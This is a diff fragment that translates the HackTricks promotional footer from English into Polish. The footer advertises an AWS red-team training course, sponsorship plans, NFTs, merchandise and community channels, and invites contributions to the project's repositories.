-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
+* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
+* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do repozytorium** [**hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
